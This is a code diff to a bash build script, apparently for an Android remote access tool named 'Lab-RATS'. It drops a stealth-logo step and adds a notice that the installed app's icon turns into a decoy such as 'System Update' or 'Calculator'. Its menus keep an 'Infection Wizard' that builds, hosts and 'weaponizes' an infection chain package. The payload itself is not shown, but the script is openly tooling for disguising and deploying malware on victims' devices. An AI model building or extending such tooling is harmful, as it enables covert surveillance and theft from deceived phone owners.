@@ -24,10 +24,6 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
 CONFIG_FILE="$SCRIPT_DIR/build_config.txt"
 
-# Default logos
-DEFAULT_LOGO="$PROJECT_DIR/assets/app_logo.png"
-COVERT_LOGO="$PROJECT_DIR/assets/default_app_icon.png"
-
 # Banner
 print_banner() {
     clear
@@ -162,33 +158,6 @@ EOF
     echo -e "${GREEN}[✓] Keystore ready${NC}"
 }
 
-# Configure logo
-configure_logo() {
-    echo -e "${CYAN}[*] Logo Configuration${NC}"
-    echo "    1. Use Recommended Stealth logo (grey gear)"
-    echo "    2. Use default Lab-RATS logo"
-    echo "    3. Use custom logo (path)"
-    echo "    4. Skip"
-    read -p "    Choice (Default 1): " LOGO_OPTION
-    LOGO_OPTION=${LOGO_OPTION:-1}
-
-    case $LOGO_OPTION in
-        1)
-           # Recommended Stealth logo (Zoomed out 15% for perfect fit)
-           if command -v magick &> /dev/null; then
-               magick convert "$COVERT_LOGO" -resize 85% -gravity center -extent 512x512 "$PROJECT_DIR/app/src/main/res/drawable/default_app_icon.png"
-           elif command -v convert &> /dev/null; then
-               convert "$COVERT_LOGO" -resize 85% -gravity center -extent 512x512 "$PROJECT_DIR/app/src/main/res/drawable/default_app_icon.png"
-           else
-               cp "$COVERT_LOGO" "$PROJECT_DIR/app/src/main/res/drawable/default_app_icon.png" 2>/dev/null
-           fi
-           ;;
-        2) cp "$DEFAULT_LOGO" "$PROJECT_DIR/app/src/main/res/drawable/default_app_icon.png" 2>/dev/null ;;
-        3) read -p "    Enter path: " P; [ -f "$P" ] && cp "$P" "$PROJECT_DIR/app/src/main/res/drawable/default_app_icon.png" ;;
-    esac
-    echo -e "${GREEN}[✓] Logo applied${NC}"
-}
-
 # Configure app settings
 configure_app() {
     echo -e "${CYAN}[*] App Configuration${NC}"
@@ -207,8 +176,10 @@ configure_app() {
     MIN_SDK=${MIN_SDK:-21}
 
     echo -e "${CYAN}[*] Decoy Identity Selection${NC}"
+    echo -e "${YELLOW}    (The app logo will transform into your selection immediately after install on device)${NC}"
     echo "    1. System Update (Gear)  2. Calculator"
     echo "    3. Weather               4. Settings"
+    echo "    5. Lab-RATS Logo"
     read -p "    Choice (Default 1): " DECOY_CHOICE
     DECOY_CHOICE=${DECOY_CHOICE:-1}
 
@@ -450,7 +421,6 @@ infection_wizard() {
     # Build sequence
     check_requirements || return
     generate_keystore
-    configure_logo
     configure_app
     build_apk || return
 
@@ -518,10 +488,9 @@ show_help() {
     echo "------------------------------------------------------------"
     echo -e "1. Start Build: Standard production flow."
     echo -e "2. Keystore Only: Unique signing certificate."
-    echo -e "3. Logo Only: Change app icons."
-    echo -e "4. App Settings: Change ID, Name, and Version."
-    echo -e "5. Requirements: Check Java setup."
-    echo -e "6. Infection Wizard: Full Build -> Host -> Weaponize."
+    echo -e "3. App Settings: Change ID, Name, and Version."
+    echo -e "4. Requirements: Check Java setup."
+    echo -e "5. Infection Wizard: Full Build -> Host -> Weaponize."
     echo "------------------------------------------------------------"
     read -p "Press Enter..."
 }
@@ -533,25 +502,23 @@ main_menu() {
     echo ""
     echo "    1. Start Build (Configure & Build)"
     echo "    2. Generate Keystore Only"
-    echo "    3. Configure Logo Only"
-    echo "    4. Configure App Settings Only"
-    echo "    5. Check Requirements"
-    echo "    6. Generate Infection Chain Package (Wizard)"
-    echo "    7. Help / Documentation"
-    echo "    8. Exit"
+    echo "    3. Configure App Settings Only"
+    echo "    4. Check Requirements"
+    echo "    5. Generate Infection Chain Package (Wizard)"
+    echo "    6. Help / Documentation"
+    echo "    7. Exit"
     echo ""
     read -p "    Choose option (Default 1): " MENU_OPTION
     MENU_OPTION=${MENU_OPTION:-1}
 
     case $MENU_OPTION in
-        1) check_requirements && { generate_keystore; configure_logo; configure_app; build_apk; } ;;
+        1) check_requirements && { generate_keystore; configure_app; build_apk; } ;;
         2) check_requirements && generate_keystore ;;
-        3) configure_logo ;;
-        4) configure_app ;;
-        5) check_requirements; echo ""; read -p "    Press Enter to return..." ;;
-        6) infection_wizard ;;
-        7) show_help ;;
-        8) exit 0 ;;
+        3) configure_app ;;
+        4) check_requirements; echo ""; read -p "    Press Enter to return..." ;;
+        5) infection_wizard ;;
+        6) show_help ;;
+        7) exit 0 ;;
     esac
 }
 
